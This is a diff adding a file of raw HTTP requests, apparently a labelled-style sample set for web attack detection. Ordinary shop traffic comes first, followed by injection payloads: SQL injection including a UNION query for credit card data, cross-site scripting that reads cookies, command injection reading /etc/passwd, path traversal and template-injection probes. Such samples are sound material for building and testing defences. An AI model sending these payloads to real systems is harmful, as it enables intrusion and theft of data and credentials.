@@ -1,0 +1,61 @@
+GET /home HTTP/1.1
+
+GET /products?id=45 HTTP/1.1
+
+GET /search?q=iphone+14 HTTP/1.1
+
+GET /api/orders?page=1&limit=5 HTTP/1.1
+
+GET /images/logo.png HTTP/1.1
+
+POST /login HTTP/1.1
+
+username=amana&password=secure123
+
+POST /register HTTP/1.1
+
+username=testuser&email=test@example.com&password=pass123
+
+POST /contact HTTP/1.1
+
+name=Amana&message=I+need+help+with+my+order
+
+POST /checkout HTTP/1.1
+
+product_id=22&quantity=2&address=colombo
+
+GET /product?id=5 HTTP/1.1
+
+GET /profile?id=102 HTTP/1.1
+
+GET /product?id=5 OR 1=1 HTTP/1.1
+
+GET /login?username=admin'-- HTTP/1.1
+
+POST /login HTTP/1.1
+
+username=admin&password=' OR '1'='1
+
+GET /search?q=' UNION SELECT credit_card FROM users HTTP/1.1
+
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+
+GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1
+
+POST /comment HTTP/1.1
+
+comment=<script>document.cookie</script>
+
+GET /ping?ip=;whoami HTTP/1.1
+
+GET /ping?ip=$(cat /etc/passwd) HTTP/1.1
+
+GET /ping?ip=&& ls HTTP/1.1
+
+GET /download?file=../../../../etc/passwd HTTP/1.1
+
+GET /file?name=..\..\windows\win.ini HTTP/1.1
+
+GET /?name={{7*7}} HTTP/1.1
+
+GET /?name=${7*7} HTTP/1.1
